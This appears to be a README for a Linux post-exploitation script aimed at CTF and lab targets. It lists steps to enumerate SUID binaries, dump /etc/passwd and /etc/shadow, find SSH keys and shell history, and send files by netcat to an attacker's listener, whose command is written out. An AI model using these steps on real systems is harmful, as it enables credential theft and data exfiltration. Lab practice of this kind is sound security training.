# Victimfilesdownload_shell
 🔐 Post-Exploitation Enumeration & Exfiltration Script (Linux) This script is designed for CTF and lab environments to automate key post-exploitation tasks after gaining a shell on a Linux target.  🧰 Features:  Enumerates SUID binaries (priv esc vectors)  Finds world-writable files  Dumps /etc/passwd, attempts /etc/shadow  Locates SSH private keys and .bash_history  Supports Netcat-based file exfiltration to attacker machine  ⚠️ Educational Use Only – Do not use on live/production systems without permission.

🛠️ How to Use (in your lab):

🖥️ On the Victim Machine (after gaining shell):

chmod +x post_exploitation_enum_and_exfil.sh

./post_exploitation_enum_and_exfil.sh <your-kali-ip> <port>

This will:

Enumerate SUID files, world-writable files

Dump /etc/passwd, try /etc/shadow

Search for SSH keys and .bash_history

Use Netcat to send /etc/passwd back to your Kali

📡 On Your Kali (Attacker) Machine:
Start listener to receive the file:

nc -lvp <port> > passwd_loot.txt

